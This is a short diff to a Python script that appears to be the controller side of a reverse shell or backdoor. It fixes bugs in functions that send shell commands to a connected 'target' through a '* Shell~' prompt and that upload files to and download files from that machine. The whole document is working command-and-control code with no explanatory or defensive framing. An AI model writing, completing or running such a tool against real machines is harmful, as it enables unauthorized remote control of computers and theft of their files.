@@ -6,7 +6,7 @@ def reliable_send(data):
 	jsondata = json.dumps(data)
 	target.send(jsondata.encode())
 
-def reliable_rcv():
+def reliable_recv():
 	data = ''
 	while True:
 		try:
@@ -19,7 +19,7 @@ def upload_file(file_name):
 	f = open(file_name,'rb')
 	target.send(f.read())
 
-def download_file(file):
+def download_file(file_name):
 	f = open(file_name, 'wb')
 	target.settimeout(1)
 	chunk = target.recv(1024)
@@ -34,7 +34,7 @@ def download_file(file):
 
 def target_communication():
 	while True:
-		command = input('* Shell~%s:' % str(ip))
+		command = input('* Shell~%s: ' % str(ip))
 		reliable_send(command)
 		if command == 'quit':
 			break
@@ -44,7 +44,7 @@ def target_communication():
 			pass
 		elif command[:8] == 'download':
 			download_file(command[9:])
-		elif command[:6] ==' upload':
+		elif command[:6] == 'upload':
 			upload_file(command[7:])
 		else:
 			result = reliable_recv()
